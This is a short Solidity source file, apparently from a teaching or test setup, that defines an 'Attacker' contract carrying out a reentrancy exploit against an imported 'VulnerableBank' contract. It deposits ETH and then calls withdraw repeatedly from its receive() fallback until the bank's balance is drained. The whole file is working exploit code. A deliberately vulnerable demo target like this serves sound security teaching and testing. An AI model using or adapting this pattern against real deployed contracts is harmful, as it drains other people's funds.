// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {VulnerableBank} from "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1) {
            bank.withdraw();
        }
    }
}
